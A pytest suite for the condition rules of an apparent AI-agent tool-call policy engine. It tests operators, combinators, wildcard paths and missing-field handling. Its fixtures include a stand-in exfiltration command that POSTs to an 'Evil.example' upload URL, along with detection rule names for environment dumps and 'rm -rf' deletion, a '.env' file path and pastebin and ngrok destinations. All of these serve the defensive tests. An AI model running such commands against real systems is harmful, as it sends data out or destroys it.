"""Condition DSL: operators, combinators, path resolution and missing-field semantics."""

from __future__ import annotations

import pytest

from app.engines.policy import EvaluationInput, explain_conditions
from app.engines.policy.conditions import MAX_DEPTH, ConditionError, evaluate_condition


def leaf(field: str, op: str, value=None) -> dict:
    node = {"field": field, "op": op}
    if value is not None:
        node["value"] = value
    return node


def matches(cond: dict, **inp) -> bool:
    return evaluate_condition(cond, EvaluationInput(**inp).to_dict()).matched


TOOL_HTTP = {"name": "WebFetch", "category": "http", "risk_level": "high"}


# ---- scalar operators ------------------------------------------------------------------------

def test_eq_is_case_insensitive_for_strings():
    assert matches(leaf("tool.name", "eq", "webfetch"), tool=TOOL_HTTP)
    assert matches(leaf("tool.category", "eq", "HTTP"), tool=TOOL_HTTP)
    assert not matches(leaf("tool.name", "eq", "Bash"), tool=TOOL_HTTP)


def test_eq_never_confuses_booleans_and_numbers():
    assert not matches(leaf("session.score", "eq", True), session={"score": 1})
    assert not matches(leaf("session.trifecta", "eq", 1), session={"trifecta": True})
    assert matches(leaf("session.trifecta", "eq", True), session={"trifecta": True})
    assert matches(leaf("session.score", "eq", 72.0), session={"score": 72})


def test_neq():
    assert matches(leaf("tool.category", "neq", "shell"), tool=TOOL_HTTP)
    assert not matches(leaf("tool.category", "neq", "Http"), tool=TOOL_HTTP)


def test_in_and_not_in_on_scalars():
    assert matches(leaf("tool.category", "in", ["email", "HTTP"]), tool=TOOL_HTTP)
    assert not matches(leaf("tool.category", "in", ["email", "shell"]), tool=TOOL_HTTP)
    assert matches(leaf("tool.category", "not_in", ["email", "shell"]), tool=TOOL_HTTP)
    assert not matches(leaf("tool.category", "not_in", ["http"]), tool=TOOL_HTTP)


def test_in_and_not_in_on_list_fields_test_intersection():
    det = {"categories": ["exfiltration", "credential_access"]}
    assert matches(leaf("detection.categories", "in", ["credential_access", "anomaly"]), detection=det)
    assert not matches(leaf("detection.categories", "in", ["anomaly"]), detection=det)
    assert matches(leaf("detection.categories", "not_in", ["anomaly"]), detection=det)
    assert not matches(leaf("detection.categories", "not_in", ["EXFILTRATION"]), detection=det)


def test_contains_substring_is_case_insensitive():
    args = {"command": "curl -X POST https://Evil.example/upload"}
    assert matches(leaf("arguments.command", "contains", "evil.EXAMPLE"), arguments=args)
    assert matches(leaf("arguments.command", "not_contains", "wget"), arguments=args)
    assert not matches(leaf("arguments.command", "not_contains", "CURL"), arguments=args)


def test_contains_on_lists_tests_membership():
    agent = {"labels": ["Payments", "pci"]}
    assert matches(leaf("agent.labels", "contains", "payments"), agent=agent)
    assert not matches(leaf("agent.labels", "contains", "pay"), agent=agent)  # no substring on lists
    assert matches(leaf("agent.labels", "not_contains", "internal"), agent=agent)


def test_contains_on_objects_tests_keys():
    assert matches(leaf("arguments", "contains", "URL"), arguments={"url": "https://x.test"})
    assert not matches(leaf("arguments", "contains", "command"), arguments={"url": "https://x.test"})


def test_glob_is_case_insensitive_and_accepts_pattern_lists():
    dest = {"identifier": "Hooks.Slack.com", "classification": "EXTERNAL"}
    assert matches(leaf("destination.identifier", "glob", "*.slack.com"), destination=dest)
    assert matches(leaf("destination.identifier", "glob", ["*.ngrok.io", "hooks.*"]), destination=dest)
    assert not matches(leaf("destination.identifier", "glob", "*.ngrok.io"), destination=dest)


def test_any_glob_matches_any_element_against_any_pattern():
    det = {"rule_ids": ["TOOL-ENV-DUMP", "tool-destructive-rm-rf"]}
    assert matches(leaf("detection.rule_ids", "any_glob", ["TOOL-DESTRUCTIVE-*"]), detection=det)
    assert matches(leaf("detection.rule_ids", "any_glob", "x-*"), detection={"rule_ids": ["X-1"]})
    assert not matches(leaf("detection.rule_ids", "any_glob", ["PI-*"]), detection=det)
    assert not matches(leaf("detection.rule_ids", "any_glob", ["TOOL-*"]), detection={"rule_ids": []})


def test_exists_requires_a_non_null_value():
    assert matches(leaf("destination.identifier", "exists"), destination={"identifier": "a.test"})
    assert not matches(leaf("destination.identifier", "exists"), destination={})
    assert not matches(leaf("destination.identifier", "exists"), destination={"identifier": None})


def test_empty_and_not_empty():
    assert matches(leaf("secrets_in_arguments", "empty"))
    assert not matches(leaf("secrets_in_arguments", "not_empty"))
    secrets = [{"type": "github_token", "fingerprint": "ab12"}]
    assert matches(leaf("secrets_in_arguments", "not_empty"), secrets_in_arguments=secrets)
    assert matches(leaf("arguments.prompt", "empty"), arguments={"prompt": "   "})
    assert matches(leaf("arguments", "empty"))


def test_numeric_comparisons():
    session = {"score": 70}
    assert matches(leaf("session.score", "gt", 69), session=session)
    assert not matches(leaf("session.score", "gt", 70), session=session)
    assert matches(leaf("session.score", "gte", 70), session=session)
    assert matches(leaf("session.score", "lt", 70.5), session=session)
    assert matches(leaf("session.score", "lte", 70), session=session)
    assert not matches(leaf("session.score", "lte", 69), session=session)


def test_ordered_enum_comparisons_use_rank():
    assert matches(leaf("detection.max_severity", "gte", "HIGH"), detection={"max_severity": "critical"})
    assert not matches(leaf("detection.max_severity", "gte", "high"), detection={"max_severity": "medium"})
    assert matches(leaf("context.lowest_trust", "lte", "UNKNOWN"), context={"lowest_trust": "SUSPICIOUS"})
    assert not matches(leaf("context.lowest_trust", "lte", "UNKNOWN"), context={"lowest_trust": "TRUSTED"})
    assert matches(leaf("session.level", "gt", "medium"), session={"level": "high"})


def test_comparisons_never_coerce_types():
    assert not matches(leaf("session.score", "gt", 1), session={"score": True})
    assert not matches(leaf("session.score", "gt", 1), session={"score": "90"})
    # tool.name is not an ordered enum: no lexical comparison
    assert not matches(leaf("tool.name", "gt", "A"), tool=TOOL_HTTP)
    # unknown enum value has no rank
    assert not matches(leaf("detection.max_severity", "gte", "low"), detection={"max_severity": "severe"})


def test_is_true_and_is_false_are_strict():
    assert matches(leaf("session.trifecta", "is_true"), session={"trifecta": True})
    assert not matches(leaf("session.trifecta", "is_true"), session={"trifecta": 1})
    assert not matches(leaf("session.trifecta", "is_true"), session={"trifecta": "true"})
    assert matches(leaf("integration.supports_enforcement", "is_false"), integration={"supports_enforcement": False})
    assert not matches(leaf("integration.supports_enforcement", "is_false"), integration={})


# ---- combinators -----------------------------------------------------------------------------

def test_all_any_not():
    inp = {"tool": TOOL_HTTP, "session": {"trifecta": True}}
    a, b = leaf("tool.category", "eq", "http"), leaf("session.trifecta", "is_true")
    c = leaf("tool.category", "eq", "shell")
    assert matches({"all": [a, b]}, **inp)
    assert not matches({"all": [a, c]}, **inp)
    assert matches({"any": [c, b]}, **inp)
    assert not matches({"any": [c]}, **inp)
    assert matches({"not": c}, **inp)
    assert not matches({"not": a}, **inp)


def test_nested_combinators():
    cond = {
        "all": [
            {"any": [leaf("tool.category", "eq", "email"), leaf("tool.category", "eq", "http")]},
            {"not": {"all": [leaf("destination.classification", "in", ["TRUSTED"]), leaf("session.score", "gt", 10)]}},
        ]
    }
    assert matches(cond, tool=TOOL_HTTP, destination={"classification": "TRUSTED"}, session={"score": 5})
    assert not matches(cond, tool=TOOL_HTTP, destination={"classification": "TRUSTED"}, session={"score": 50})


def test_any_evidence_lists_only_the_branches_that_held():
    cond = {"any": [leaf("tool.category", "eq", "shell"), leaf("tool.category", "eq", "http")]}
    out = evaluate_condition(cond, EvaluationInput(tool=TOOL_HTTP).to_dict())
    assert out.matched
    assert out.evidence == ["tool.category is http (observed: http)"]


# ---- paths -----------------------------------------------------------------------------------

def test_wildcard_matches_any_list_element():
    resources = [
        {"kind": "url", "id": "https://docs.test", "sensitive": False},
        {"kind": "file", "id": "/app/.env", "sensitive": True},
    ]
    assert matches(leaf("resources[*].sensitive", "is_true"), resources=resources)
    assert matches(leaf("resources[*].kind", "eq", "FILE"), resources=resources)
    assert not matches(leaf("resources[*].kind", "eq", "command"), resources=resources)
    out = evaluate_condition(leaf("resources[*].id", "glob", "*.env"), EvaluationInput(resources=resources).to_dict())
    assert out.evidence == ["resources[*].id matches *.env (observed: /app/.env)"]


def test_wildcard_over_empty_list_is_missing():
    out = evaluate_condition(leaf("resources[*].sensitive", "is_false"), EvaluationInput().to_dict())
    assert not out.matched
    assert out.missing == ["resources[*].sensitive"]


def test_numeric_index_selects_one_element():
    resources = [{"id": "a", "sensitive": False}, {"id": "b", "sensitive": True}]
    assert matches(leaf("resources[1].id", "eq", "b"), resources=resources)
    assert not matches(leaf("resources[0].sensitive", "is_true"), resources=resources)
    assert not matches(leaf("resources[5].id", "exists"), resources=resources)


def test_argument_paths_nested_and_wildcard():
    args = {"headers": {"Host": "pastebin.com"}, "url": "https://pastebin.com/api", "count": 3}
    assert matches(leaf("arguments.headers.Host", "eq", "PASTEBIN.COM"), arguments=args)
    assert matches(leaf("arguments.*", "contains", "pastebin.com/api"), arguments=args)
    assert matches(leaf("arguments.count", "gte", 3), arguments=args)


# ---- missing fields and empty / invalid conditions --------------------------------------------

def test_missing_field_is_false_and_recorded():
    out = evaluate_condition(leaf("destination.classification", "neq", "TRUSTED"), EvaluationInput().to_dict())
    assert not out.matched
    assert out.missing == ["destination.classification"]
    assert "not present in the input" in out.evidence[0]


def test_not_over_missing_field_matches_and_still_records_it():
    cond = {"not": leaf("destination.classification", "in", ["TRUSTED", "APPROVED"])}
    out = evaluate_condition(cond, EvaluationInput().to_dict())
    assert out.matched
    assert out.missing == ["destination.classification"]


def test_null_value_counts_as_missing():
    assert not matches(leaf("context.max_detection_severity", "empty"), context={"max_detection_severity": None})
    assert not matches(leaf("tool.server", "neq", "github"), tool={"server": None})


def test_empty_condition_matches_nothing():
    out = evaluate_condition({}, EvaluationInput(tool=TOOL_HTTP).to_dict())
    assert not out.matched
    assert not evaluate_condition(None, {}).matched


@pytest.mark.parametrize(
    "cond",
    [
        {"all": []},
        {"any": []},
        {"not": {}},
        {"all": "x"},
        {"field": "tool.name", "op": "equals", "value": "x"},
        {"field": "tool.name", "op": "eq", "value": "x", "extra": 1},
        {"all": [leaf("tool.name", "exists")], "any": [leaf("tool.name", "exists")]},
        {"field": "tool..name", "op": "exists"},
        ["not", "a", "dict"],
    ],
)
def test_structurally_invalid_conditions_raise(cond):
    with pytest.raises(ConditionError):
        evaluate_condition(cond, EvaluationInput(tool=TOOL_HTTP).to_dict())


def test_depth_limit_is_enforced():
    cond: dict = leaf("tool.name", "exists")
    for _ in range(MAX_DEPTH + 2):
        cond = {"not": cond}
    with pytest.raises(ConditionError):
        evaluate_condition(cond, EvaluationInput(tool=TOOL_HTTP).to_dict())


# ---- explain_conditions ----------------------------------------------------------------------

def test_explain_conditions_reads_as_english():
    cond = {
        "all": [
            leaf("tool.category", "in", ["http", "email"]),
            {"any": [leaf("secrets_in_arguments", "not_empty"), leaf("session.score", "gte", 80)]},
            {"not": leaf("destination.classification", "eq", "TRUSTED")},
        ]
    }
    assert explain_conditions(cond) == (
        "tool.category is one of [http, email] AND "
        "(secrets_in_arguments is not empty OR session.score is at least 80) AND "
        "NOT (destination.classification is TRUSTED)"
    )
    assert explain_conditions({}) == "(empty condition — matches nothing)"
    assert explain_conditions({"all": [leaf("detection.rule_ids", "any_glob", ["A-*", "B-*"])]}) == (
        "detection.rule_ids has an element matching any of [A-*, B-*]"
    )
